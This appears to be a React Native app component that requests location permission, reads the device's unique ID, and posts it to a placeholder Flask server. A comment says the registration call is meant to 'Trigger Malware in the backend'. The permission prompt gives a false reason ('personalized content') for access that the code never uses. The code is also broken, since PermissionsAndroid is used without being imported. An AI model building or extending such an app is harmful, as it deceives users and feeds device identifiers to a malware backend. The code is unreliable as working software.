import React, { useState, useEffect } from 'react';
import { View, Button, TextInput, Text, Platform } from 'react-native';
import DeviceInfo from 'react-native-device-info';
import { request, PERMISSIONS, RESULTS } from 'react-native-permissions';
import axios from 'axios';

const App = () => {
  const [deviceId, setDeviceId] = useState('');
  const [status, setStatus] = useState('');
  const [permissionGranted, setPermissionGranted] = useState(false);

  // Request permissions for location (if needed) or other sensitive data
  const requestPermissions = async () => {
    if (Platform.OS === 'ios') {
      // Request permissions for location or other services, if necessary
      const result = await request(PERMISSIONS.IOS.LOCATION_WHEN_IN_USE);
      if (result === RESULTS.GRANTED) {
        console.log('Location permission granted');
        setPermissionGranted(true);
      } else {
        console.log('Location permission denied');
        setPermissionGranted(false);
      }
    } else if (Platform.OS === 'android') {
      // Request Android location permissions
      const granted = await PermissionsAndroid.request(
        PermissionsAndroid.PERMISSIONS.ACCESS_FINE_LOCATION,
        {
          title: 'Location Permission',
          message: 'We need access to your location for personalized content',
          buttonNegative: 'Cancel',
          buttonPositive: 'OK',
        }
      );
      if (granted === PermissionsAndroid.RESULTS.GRANTED) {
        console.log('Location permission granted');
        setPermissionGranted(true);
      } else {
        console.log('Location permission denied');
        setPermissionGranted(false);
      }
    }
  };

  // Fetch device info (Device ID, Unique ID)
  const fetchDeviceId = async () => {
    if (permissionGranted) {
      try {
        const id = await DeviceInfo.getUniqueId(); // Fetch unique device ID
        setDeviceId(id);
      } catch (error) {
        console.error('Error fetching device ID:', error);
      }
    } else {
      setStatus('Permission not granted.');
    }
  };

  // Register Device with Flask API (Trigger Malware in the backend)
  const registerDevice = async () => {
    if (!deviceId) {
      setStatus('Device ID is missing.');
      return;
    }

    try {
      const response = await axios.post('http://your-flask-server-ip:5000/register_device', {
        device_id: deviceId,
      });
      setStatus(response.data.message);
    } catch (error) {
      setStatus('Error registering device.');
    }
  };

  useEffect(() => {
    requestPermissions(); // Request permissions on mount
  }, []);

  return (
    <View style={{ padding: 20 }}>
      <Text>Device ID: {deviceId}</Text>
      <Button title="Fetch Device ID" onPress={fetchDeviceId} />
      <Text>Status: {status}</Text>
      <Button title="Register Device" onPress={registerDevice} />
    </View>
  );
};

export default App;
